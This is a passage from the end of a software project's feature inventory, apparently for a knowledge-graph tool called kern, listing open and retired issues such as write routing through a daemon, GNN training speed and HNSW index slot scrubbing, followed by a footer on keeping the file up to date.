   last four closed 2026-07-21, and they were the ones that mattered most: with
   no routing at all they reached `with_graph`, which writes the whole kern map
   back unguarded over whatever the daemon had committed. `kern mcp`'s
   standalone fallback — the last long-lived second writer, and one no probe
   could see — was deleted with the MCP surface 2026-08-16, so the daemon is
   the only long-lived writer left. The read side is done: `get` and `query` route
   through the same `query` tool and print through one printer, with the local
   load as the `NoDaemon` fallback; `search` and `list` stay local by decision.
   `kern link` no longer clobbers a racing commit — it flushes through
   `save_graph_guarded` (`src/commands/src/commands_graph_ops.rs`) — but it still does not
   route, and neither does `ingest`: over `call_tool` they would land at agent
   trust, and kern carries no caller identity by decision (2026-07-22), so the
   route-or-stay-local choice is owed. `intake drain` got its tool
   2026-07-21 and routes. Open as `ROADMAP.md` item 9 on `ingest`/`link` alone.
6. **GNN training has no GPU path** — linear in edges and off the tick since
   item 28 (11.6s at 4096, was 79.7s); `gnn_train_refused` now reaches `kern health`.
7. **Distill prompt** is one-shot and global — per-kind prompts +
   chunking for long deltas would raise claim quality.
8. (retired 2026-07-21 — one scrub pass per sweep, not one per victim)
   `HnswIndex::delete` (`src/graph/src/hnsw.rs:136`) drops the node and pushes the
   slot to `pending_scrub`; `scrub_pending` (`:153`) clears every dead slot in a
   single walk, and only then may a slot enter `free`, so nothing can alias it.
9. (retired 2026-07-21 — the LLM rerank left with the answer leg) a small
   cross-encoder trained on `degrade` feedback could replace it.
10. **Only `GnnPropagate` reports a contained failure** — the panic guard covers
    every task, but a task that returns early instead of dying is still
    invisible outside its own logs.

---

*Scraped from source at `v2.0.0`, last reconciled against the tree 2026-08-07;
federation-removal, MCP-removal and local-federation surfaces (§1, §4, §12–§15,
§18/§18a/§18b, §23, §24) re-verified against source 2026-08-16.
Update this file when a subsystem's public surface changes — it is the canonical
feature inventory. The stamp is a date, not a commit: a commit hash here ages
into a lie the moment the next one lands, and nothing checks it.*
